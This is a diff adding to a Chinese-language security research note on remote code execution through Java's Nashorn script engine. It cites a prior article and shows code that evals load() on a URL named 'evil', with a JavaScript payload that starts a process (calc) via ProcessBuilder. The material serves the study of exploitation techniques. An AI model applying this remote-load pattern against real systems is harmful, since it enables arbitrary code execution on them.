@@ -150,5 +150,13 @@ public class main {
 
 之前在安全客上介绍了这个利用思路[文章](https://www.anquanke.com/post/id/248771#h3-3)，当时没有利用成功，今天晚上jiang师傅给我说了利用思路。大概是一个load()去远程加载执行。
 
-
 https://anuradha-15.medium.com/loading-scripts-using-nashorn-85585f495cf0
+
+```java
+String url = "http://127.0.0.1:8089/evil" ;
+eval("load('"+url+"')");
+```
+evil
+```java
+var a=exp();function exp(){var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();};
+```
